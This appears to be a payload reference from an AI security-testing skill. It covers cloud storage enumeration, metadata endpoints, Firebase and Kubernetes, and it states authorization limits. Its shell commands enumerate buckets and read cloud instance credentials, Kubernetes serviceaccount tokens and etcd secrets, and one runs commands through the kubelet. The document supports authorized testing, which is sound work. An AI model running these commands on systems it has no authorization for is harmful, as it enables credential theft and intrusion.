# Cloud Storage & Metadata Endpoint Payload

> ⚠️ **Security Boundary Statement**
>
> This document is for **authorized AppSec assessment reference** only, helping identify cloud storage and metadata exposure vulnerability risk characteristics.
>
> - All payloads are **technical principle demonstrations**, actual credential exploitation prohibited
> - Cloud metadata testing requires **explicit user authorization** before probing
> - Storage bucket enumeration is for understanding exposure only, **no data download or modification**
> - Validation proves vulnerability existence (public access confirmed), **no credential usage after retrieval**
> - See `SKILL.md` for specific execution boundaries
>
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadAllTheThings, HackTricks, Cloud Security Alliance

## Manual Testing

**Note: Cloud metadata endpoints require explicit authorization. Maximum 8 probes per endpoint.**

---

## Validation Objectives (Within Security Boundary)

Cloud security vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| S3 Bucket Enumeration | ✓ Check public access | - | Download private data |
| GCS/Azure Blob Access | ✓ Check public access | - | Exfiltrate storage contents |
| Cloud Metadata Endpoints | ❌ Not by default | ✓ Requires explicit authorization | Use credentials for access |
| Firebase Open Instance | ✓ Check open rules | - | Read user data |
| S3 Bucket Listing | ✓ Confirm listing enabled | - | Download sensitive files |
| Cloud Config Exposure | ❌ Not by default | ✓ Requires explicit authorization | Exploit cloud credentials |

**Safe Validation Method**: Check public access and listing for storage buckets; only probe metadata endpoints with explicit authorization.

---

## AWS S3 Bucket Enumeration

### Common Bucket Name Patterns

```bash
# Bucket name guessing based on domain
# Try variations: company name, domain, common names

# Enumerate bucket access
for bucket in company-assets company-backups company-data company-files company-logs company-uploads company-static; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://${bucket}.s3.amazonaws.com/" 2>/dev/null)
  if [ "$status" != "404" ] && [ "$status" != "000" ]; then
    echo "[+] bucket: ${bucket} -> ${status}"
  fi
done
```

### S3 Bucket Access Testing

```bash
# Check if bucket exists and is accessible
curl -s "https://bucket-name.s3.amazonaws.com/" | head -20

# List bucket contents (if listing enabled)
curl -s "https://bucket-name.s3.amazonaws.com/?list-type=2"

# Check specific file
curl -sI "https://bucket-name.s3.amazonaws.com/sensitive-file.txt"

# Check bucket metadata
curl -s "https://bucket-name.s3.amazonaws.com/?list-type=2" | grep -E "Key|Size|LastModified"
```

### S3 Bucket ACL Check

```bash
# Check bucket ACL (requires bucket to allow it)
curl -s "https://bucket-name.s3.amazonaws.com/?acl"

# Check bucket policy
curl -s "https://bucket-name.s3.amazonaws.com/?policy"

# Check bucket logging
curl -s "https://bucket-name.s3.amazonaws.com/?logging"

# Check bucket versioning
curl -s "https://bucket-name.s3.amazonaws.com/?versioning"
```

---

## Google Cloud Storage (GCS)

### GCS Bucket Enumeration

```bash
# GCS bucket name format: gs://bucket-name
# Check public access

curl -s "https://storage.googleapis.com/bucket-name/" | head -20

# List objects (if public listing enabled)
curl -s "https://storage.googleapis.com/storage/v1/b/bucket-name/o"

# Check specific object
curl -sI "https://storage.googleapis.com/bucket-name/sensitive-file.txt"

# Enumerate common bucket names
for bucket in company-assets company-data company-backups company-static; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://storage.googleapis.com/${bucket}/" 2>/dev/null)
  if [ "$status" != "404" ] && [ "$status" != "000" ]; then
    echo "[+] bucket: ${bucket} -> ${status}"
  fi
done
```

---

## Azure Blob Storage

### Azure Blob Enumeration

```bash
# Azure blob URL format: https://account.blob.core.windows.net/container/
# Check public access

curl -s "https://account.blob.core.windows.net/container/?comp=list" | head -20

# List blobs in public container
curl -s "https://account.blob.core.windows.net/container/?restype=container&comp=list"

# Check specific blob
curl -sI "https://account.blob.core.windows.net/container/sensitive-file.txt"

# Common container names
for container in backup data logs public uploads assets; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://account.blob.core.windows.net/${container}/?restype=container&comp=list" 2>/dev/null)
  if [ "$status" != "404" ] && [ "$status" != "000" ]; then
    echo "[+] container: ${container} -> ${status}"
  fi
done
```

---

## ⚠️ Cloud Metadata Endpoints (Requires Authorization)

**Authorization Requirements**:
1. User explicitly authorizes cloud metadata endpoint probing
2. Only for proving SSRF capability or metadata exposure, no credential exploitation
3. Mark "Cloud metadata probed with user authorization" in report

### AWS EC2 Instance Metadata

```bash
# ⚠️ Requires explicit authorization - only via SSRF or direct instance access
# AWS IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/user-data/

# AWS IMDSv2 (requires token first)
# Step 1: Get token
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# Step 2: Use token
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/"

# Security boundary: Read metadata only to prove access; obtained credentials not used
```

### GCP Instance Metadata

```bash
# ⚠️ Requires explicit authorization and Header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/project/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Access with required header
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/id"
```

### Azure Instance Metadata

```bash
# ⚠️ Requires explicit authorization and Header: Metadata: true
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Access with required header
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### DigitalOcean Metadata

```bash
# ⚠️ Requires explicit authorization
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json

# Access
curl -s "http://169.254.169.254/metadata/v1.json"
```

---

## Firebase Open Instance Detection

### Firebase Database Enumeration

```bash
# Check for open Firebase realtime database
curl -s "https://project-name.firebaseio.com/.json" | head -20

# If returns JSON data: database is publicly readable
# Check rules
curl -s "https://project-name.firebaseio.com/.json?auth=INVALID_TOKEN"

# Common Firebase URL patterns
for project in company-app company-prod company-dev company-staging; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://${project}.firebaseio.com/.json" 2>/dev/null)
  if [ "$status" == "200" ]; then
    echo "[+] Firebase open: ${project}.firebaseio.com -> ${status}"
  fi
done
```

### Firebase Firestore

```bash
# Check for open Firestore
curl -s "https://firestore.googleapis.com/v1/projects/project-name/databases/(default)/documents"

# Check Firebase Hosting
curl -s "https://project-name.web.app/" | head -20
curl -s "https://project-name.firebaseapp.com/" | head -20
```

---

## OWASP Category & CWE

| Category | Mapping |
|----------|---------|
| OWASP Web | A05:2021-Security Misconfiguration |
| OWASP Web | A01:2021-Broken Access Control |
| CWE | CWE-200: Exposure of Sensitive Information to an Unauthorized Actor |
| CWE | CWE-918: Server-Side Request Forgery (SSRF) |

---

## Analysis Process

1. Identify target domain and derive potential bucket/storage names
2. Enumerate S3/GCS/Azure storage for public access
3. Check listing permissions on discovered buckets
4. **If SSRF found**: Request explicit authorization before probing cloud metadata
5. For Firebase: Test common project names for open databases
6. Document all publicly accessible resources
7. **Stop validation**, report exposure findings without exploiting access

---

## Output

```markdown
## Vulnerability: Cloud Storage Exposure / Metadata Access

### Location
{Cloud URL / Endpoint}

### Type
{S3 Bucket / GCS Bucket / Azure Blob / Cloud Metadata / Firebase}

### Evidence
- Public access: {yes/no}
- Listing enabled: {yes/no}
- Sensitive data visible: {metadata type only, no actual data}

### Validation Result
- Storage publicly accessible: ✅ Confirmed
- Bucket listing enabled: {yes/no}
- Metadata endpoint reachable: {yes - with authorization only}
- Firebase open instance: {yes/no}

### Additional Validation (If Authorized)
- Cloud metadata: {Only if authorized; mark "with user authorization"}

### Risk Level
{Critical/High/Medium} - {Storage type} exposed with {access level} access
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Download private data | Do not download files from publicly accessible storage |
| ❌ Use cloud credentials | Metadata credentials are evidence only, not for access |
| ❌ Modify storage contents | Do not upload, modify, or delete any storage objects |
| ❌ Enumerate without scope | Only target authorized domains/projects |
| ❌ Lateral movement via credentials | Do not use discovered credentials for further access |
| ❌ Exfiltrate database contents | Firebase data is evidence of exposure, not for extraction |

---

## Chinese Cloud Providers

### Aliyun OSS (Alibaba Cloud Object Storage)

```bash
# OSS bucket URL formats:
# https://{bucket}.oss-{region}.aliyuncs.com/
# https://{bucket}.oss-{region}.aliyuncs.com/{object}

# Check public access
for bucket in company-assets company-backups company-data company-static company-upload; do
  for region in cn-hangzhou cn-shanghai cn-beijing cn-shenzhen cn-hongkong; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://${bucket}.oss-${region}.aliyuncs.com/" 2>/dev/null)
    if [ "$status" != "404" ] && [ "$status" != "000" ]; then
      echo "[+] OSS bucket: ${bucket} (${region}) -> ${status}"
    fi
  done
done

# List objects (if listing enabled)
curl -s "https://{bucket}.oss-{region}.aliyuncs.com/?max-keys=100"

# Check bucket ACL
curl -s "https://{bucket}.oss-{region}.aliyuncs.com/?acl"

# Alibaba Cloud metadata (requires authorization)
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Tencent COS (Tencent Cloud Object Storage)

```bash
# COS bucket URL formats:
# https://{bucket}-{appid}.cos.{region}.myqcloud.com/

# Check public access
for name in company-assets company-backups company-data; do
  for region in ap-beijing ap-shanghai ap-guangzhou ap-hongkong; do
    # Need appid — usually visible in JS/HTML source or error messages
    status=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://${name}-{appid}.cos.${region}.myqcloud.com/" 2>/dev/null)
    if [ "$status" != "404" ] && [ "$status" != "000" ]; then
      echo "[+] COS bucket: ${name}-{appid} (${region}) -> ${status}"
    fi
  done
done

# List objects
curl -s "https://{bucket}-{appid}.cos.{region}.myqcloud.com/?max-keys=100"

# Tencent Cloud metadata (requires authorization)
http://metadata.tencentyun.com/latest/meta-data/
http://metadata.tencentyun.com/latest/meta-data/instance-id
```

### Huawei Cloud OBS (Huawei Cloud Object Storage)

```bash
# OBS bucket URL formats:
# https://{bucket}.obs.{region}.myhuaweicloud.com/

# Check public access
curl -s "https://{bucket}.obs.{region}.myhuaweicloud.com/"

# Huawei Cloud metadata (requires authorization)
http://169.254.169.254/latest/meta-data/
```

---

## Kubernetes / Container Orchestration

> All K8s checks require explicit authorization and scope confirmation.

### K8s API Server Discovery

```bash
# Common K8s API ports: 6443, 8443, 443
# Check for unauthenticated API access

# API server healthz endpoint (often unauthenticated)
curl -sk https://{target}:6443/healthz
curl -sk https://{target}:6443/livez
curl -sk https://{target}:6443/version

# If unauthenticated, enumerate:
curl -sk https://{target}:6443/api/v1/namespaces
curl -sk https://{target}:6443/api/v1/pods
curl -sk https://{target}:6443/api/v1/secrets
```

### Kubelet API

```bash
# Kubelet runs on port 10250 (HTTPS) and 10255 (HTTP, deprecated)
# Check for anonymous auth

# Kubelet healthz
curl -sk https://{target}:10250/healthz

# If anonymous access allowed:
curl -sk https://{target}:10250/pods
curl -sk https://{target}:10250/metrics

# Execute command in pod (requires auth, high severity if open)
curl -sk "https://{target}:10250/exec/{namespace}/{pod}/{container}?command=id&stdout=true&stderr=true"
```

### etcd

```bash
# etcd default port: 2379
# Check for unauthenticated access

curl -sk https://{target}:2379/v2/keys/
curl -sk https://{target}:2379/v3/kv/range -X POST \
  -d '{"key": "AA==", "range_end": "AQ=="}'

# etcd stores K8s secrets — access is critical severity
```

### ServiceAccount Token Abuse

```bash
# If inside a pod (container escape / SSRF scenario):
# ServiceAccount token mounted at:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Use token to query API:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces

# Check if SA can create pods (privilege escalation path):
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"create","resource":"pods"}}}'
```

### Container Escape Surface

```bash
# Check if pod has privileged access:
# Inside the pod:
cat /proc/1/status | grep CapEff
# If CapEff: 0000003fffffffff -> privileged container

# Check mount namespace:
mount | grep -E '(cgroup|docker|kube)'

# Check for Docker socket:
ls -la /var/run/docker.sock

# Check for host filesystem mount:
mount | grep '/var/lib/docker'  # host docker access
mount | grep '/proc/sys'        # host proc access
df -h | grep -v overlay         # non-overlay mounts = potential host access
```

### Helm Chart Discovery

```bash
# Check for Helm releases
curl -sk https://{target}:6443/api/v1/namespaces/kube-system/configmaps | \
  jq -r '.items[] | select(.metadata.name | startswith("sh.helm")) | .metadata.name'

# Helm values may contain secrets
curl -sk https://{target}:6443/api/v1/namespaces/{ns}/secrets | \
  jq -r '.items[] | select(.metadata.labels.owner == "helm") | .metadata.name'
```

### Function Computing Cold-Start Info Leak

```bash
# Aliyun Function Compute
# Check for environment variable leakage via error pages or logs

# Tencent SCF
# Check for /tmp reuse between invocations (cross-user data leak)

# Generic: trigger error to check for environment variable disclosure
# In function input:
{"input": "AAAA..."}  # Large input -> trigger OOM error
# Error may reveal function name, handler, runtime, memory config
```

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Only prove existence", "Cloud metadata requires explicit authorization"
- `README.md` -> Prohibited execution checklist